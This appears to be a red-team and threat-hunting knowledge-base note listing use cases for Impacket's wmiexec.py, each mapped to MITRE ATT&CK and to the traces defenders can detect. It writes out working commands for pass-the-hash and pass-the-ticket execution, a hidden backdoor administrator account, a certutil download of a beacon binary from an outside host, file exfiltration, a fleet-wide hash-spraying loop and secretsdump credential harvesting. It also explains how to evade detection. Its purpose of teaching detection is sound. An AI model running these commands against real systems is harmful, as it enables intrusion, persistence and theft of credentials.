# Impacket — wmiexec.py — Hands-On Use Cases

Every scenario below rides the same DCOM/WMI execution path documented in `01 - Overview.md` §How It Works — what changes is the credential material, whether an output-relay file ever gets written, and how much of the process chain (`cmd.exe`, the loopback SMB round-trip) the operator strips out. MITRE ATT&CK technique(s) are tagged per scenario since the combination shifts depending on the variant (e.g. adding pass-the-hash layers `T1550.002` on top of the baseline `T1047`/`T1021.003`).

## Contents
- [Semi-Interactive Shell via Cleartext Credentials](#semi-interactive-shell-via-cleartext-credentials)
- [Pass-the-Hash](#pass-the-hash)
- [Pass-the-Ticket (Kerberos)](#pass-the-ticket-kerberos)
- [Kerberos with an AES Key or Keytab](#kerberos-with-an-aes-key-or-keytab)
- [Authenticating from an smbclient-Style Auth File](#authenticating-from-an-smbclient-style-auth-file)
- [One-Shot, Non-Interactive Command Execution](#one-shot-non-interactive-command-execution)
- [Fully Blind Execution with -silentcommand](#fully-blind-execution-with--silentcommand)
- [Output-Suppressed Execution with -nooutput](#output-suppressed-execution-with--nooutput)
- [Switching to a PowerShell Semi-Interactive Shell](#switching-to-a-powershell-semi-interactive-shell)
- [Moving the Output Relay Off ADMIN$](#moving-the-output-relay-off-admin)
- [Uploading and Downloading Files Mid-Session](#uploading-and-downloading-files-mid-session)
- [Forcing a Specific DCOM Version](#forcing-a-specific-dcom-version)
- [Fleet-Wide / Mass Execution](#fleet-wide--mass-execution)
- [Chained Use After Credential Harvesting](#chained-use-after-credential-harvesting)

---

## Semi-Interactive Shell via Cleartext Credentials

**MITRE ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047/) (Windows Management Instrumentation) · [T1021.003](https://attack.mitre.org/techniques/T1021/003/) (Remote Services: Distributed Component Object Model) · [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Command and Scripting Interpreter: Windows Command Shell)

The baseline case — every other scenario in this note is a variation on this one.

```bash
# 1. (optional) confirm creds are valid + local-admin before touching the target
netexec smb 10.10.10.5 -u 'jsmith' -p 'Summer2026!' --local-auth

# 2. Get a semi-interactive shell
wmiexec.py 'CORP/jsmith:Summer2026!@10.10.10.5'
```
Lands in a `C:\>` prompt running as `CORP\jsmith` (not SYSTEM) — every command typed round-trips through the write→read→delete cycle documented in `01 - Overview.md`.

## Pass-the-Hash

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash), plus the baseline T1047/T1021.003

```bash
# LM hash unknown/blank -> use the standard blank-LM placeholder
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  CORP/administrator@10.10.10.5
```
The NT hash authenticates **both** the SMB connection (output relay) and the DCOM connection (execution) — no cleartext password is ever needed for either.

## Pass-the-Ticket (Kerberos)

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket) · T1047 · T1021.003

```bash
# Prereqs: hostname (not bare IP) must resolve, clock skew < 5 min from the DC
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass CORP/administrator@dc01.corp.local
```
As with psexec, Kerberos requires the target's **FQDN** since the ticket is bound to an SPN — a bare IP breaks the Kerberos path for both the SMB and DCOM legs.

## Kerberos with an AES Key or Keytab

**MITRE ATT&CK:** T1550.003 · T1047 · T1021.003 — quieter variant, avoids NTLM entirely

```bash
# AES key (128 or 256-bit) instead of a password/RC4 material
wmiexec.py -k -no-pass -aesKey <256-bit-aes-key-hex> CORP/svc-backup@dc01.corp.local

# Or: authenticate a service account straight from a keytab
wmiexec.py -k -no-pass -keytab svc-backup.keytab CORP/svc-backup@dc01.corp.local
```
Common for **service-account** abuse — service accounts frequently carry keytabs or long-lived AES keys rather than interactively-typed passwords, and this path never generates the weaker RC4/NTLM authentication traffic that some detections specifically watch for.

## Authenticating from an smbclient-Style Auth File

```bash
cat > wmiexec.auth <<EOF
username = administrator
password = Summer2026!
domain = CORP
EOF

wmiexec.py -A wmiexec.auth 10.10.10.5
```
Keeps the credential off the shell command line entirely — useful specifically because of the source-side exposure documented in `03 - Source Evidence.md` (bash/zsh history capturing inline `user:password@target` strings, and `/proc/<pid>/cmdline` exposure to any local user while the process is running).

## One-Shot, Non-Interactive Command Execution

```bash
wmiexec.py CORP/jsmith:Summer2026!@10.10.10.5 "whoami /all"
```
The full write→read→delete output cycle still runs once for a single command — useful for scripted execution across many hosts rather than a live interactive session (see [Fleet-Wide / Mass Execution](#fleet-wide--mass-execution) below).

## Fully Blind Execution with -silentcommand

**MITRE ATT&CK:** T1047 · [T1564](https://attack.mitre.org/techniques/T1564/) (Hide Artifacts) — the deliberate-evasion variant

```bash
wmiexec.py -silentcommand CORP/jsmith:Summer2026!@10.10.10.5 \
  "net user backdoor Summer2026! /add && net localgroup administrators backdoor /add"
```
The single most important operational-security variant in this note. `-silentcommand` skips the SMB connection entirely (no output file, no `-share` access at all) **and** strips the `cmd.exe /Q /c` wrapper, so `Win32_Process.Create()` launches the raw command directly as `WmiPrvSE.exe`'s child. No output is returned to the operator — this is fire-and-forget, appropriate when the operator already knows what the command does (account creation, service manipulation, staging a payload) and doesn't need to see console output. This breaks the "cmd.exe under WmiPrvSE.exe" process-tree assumption that most WMI-execution detections lean on — see the hunting-priority note in `05 - Detection and Hunting.md`.

## Output-Suppressed Execution with -nooutput

```bash
wmiexec.py -nooutput CORP/jsmith:Summer2026!@10.10.10.5 "certutil -urlcache -f http://198.51.100.7/beacon.exe C:\Windows\Temp\svc.exe"
```
Distinct from `-silentcommand`: the command is still wrapped in `cmd.exe /Q /c`, so `WmiPrvSE.exe → cmd.exe → <command>` is still the process chain — but no SMB connection is created and no output file is written or read back. Useful when the operator wants the `cmd.exe` semantics (piping, redirection, batch syntax) without paying the round-trip cost or leaving the transient output-file artifact.

## Switching to a PowerShell Semi-Interactive Shell

**MITRE ATT&CK:** T1047 · [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (Command and Scripting Interpreter: PowerShell)

```bash
wmiexec.py -shell-type powershell CORP/jsmith:Summer2026!@10.10.10.5
```
Every command typed is base64-encoded (UTF-16LE) and launched via `powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc <b64>`, itself still wrapped under `cmd.exe /Q /c` (combine with `-silentcommand` to drop the `cmd.exe` hop too). This is what an operator reaches for to use PowerShell cmdlets/modules instead of native `cmd.exe` syntax — and it's what generates PowerShell-specific target evidence (Script Block Logging, Event ID 4104) documented in `04 - Target Evidence.md`.

## Moving the Output Relay Off ADMIN$

```bash
wmiexec.py -share C$ CORP/jsmith:Summer2026!@10.10.10.5
```
Relocates the transient `__<timestamp>` output file from `C:\Windows\` to `C:\`. Useful if `ADMIN$` isn't writable with the supplied credentials, or as a minor blend-in variant — but note this is a much narrower evasion surface than psexec's naming flags: there's no service or binary name to rename here, because wmiexec creates neither. The `__<timestamp>` naming pattern itself is unaffected by `-share` — only its location changes.

## Uploading and Downloading Files Mid-Session

```bash
wmiexec.py CORP/jsmith:Summer2026!@10.10.10.5
# inside the semi-interactive shell:
wmiexec> lput ./enum.exe C:\Windows\Temp\
wmiexec> C:\Windows\Temp\enum.exe
wmiexec> lget C:\Users\jsmith\Documents\loot.txt
```
**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer) for `lput`, [T1041](https://attack.mitre.org/techniques/T1041/) (Exfiltration Over C2 Channel) for `lget`

`lput`/`lget` are the closest wmiexec gets to psexec's `-c` secondary-payload drop — but they're session commands over SMB, not a CLI-level flag, and the file they move is completely independent of the `__<timestamp>` output-relay file. A `lput`-dropped binary is a **second, persistent** filesystem artifact distinct from the transient output file — see `04 - Target Evidence.md`.

## Forcing a Specific DCOM Version

```bash
wmiexec.py -com-version 5.7 CORP/jsmith:Summer2026!@10.10.10.5
```
Overrides OXID-resolution auto-negotiation with an explicit `MAJOR_VERSION:MINOR_VERSION` pair — mainly a compatibility fix for nonstandard/older DCOM configurations, occasionally used to match a specific target OS's expected DCOM version rather than whatever Impacket negotiates by default.

## Fleet-Wide / Mass Execution

```bash
# Scripted across a target list — common for password-spray validation,
# IOC sweeps, or (on the attacker side of a real intrusion) ransomware staging
for ip in $(cat targets.txt); do
  echo "[*] $ip"
  wmiexec.py -silentcommand -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
    CORP/administrator@"$ip" "whoami" 2>&1 | tee -a results.log
done
```
`-silentcommand` is frequently paired with fleet-wide use specifically because it avoids the per-host SMB round-trip (faster at scale) and avoids leaving dozens of near-simultaneous `ADMIN$` file-write events across the swept hosts — the fleet-level signal shifts almost entirely onto the DCOM/RPC authentication burst and the `WmiPrvSE.exe` process-creation pattern (see `05 - Detection and Hunting.md`'s Fleet-Wide Sweep).

## Chained Use After Credential Harvesting

This is the canonical Impacket workflow — `wmiexec.py` is rarely the *first* tool run in an intrusion; it's usually the payoff step after credential material was harvested by a sibling Impacket script.

```bash
# 1. Dump local SAM hashes from an already-compromised host
secretsdump.py CORP/jsmith:Summer2026!@10.10.10.20 -sam -system

# 2. Immediately reuse a recovered local admin hash to move to the next host,
#    choosing wmiexec.py over psexec.py specifically to avoid a SYSTEM-context,
#    service-based artifact trail on the new host
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<recovered-nt-hash> \
  Administrator@10.10.10.21
```
Recognizing this **chain** — not just the individual tool — is what separates a fast, high-confidence detection from a slow one: a `secretsdump.py`-shaped access pattern against one host followed within minutes by a `wmiexec.py`-shaped DCOM authentication + `WmiPrvSE.exe` spawn against a *different* host, using the *same source IP*, is a textbook Impacket lateral-movement chain — the same pattern documented for psexec, just with WMI's execution fingerprint instead of a service-install fingerprint.
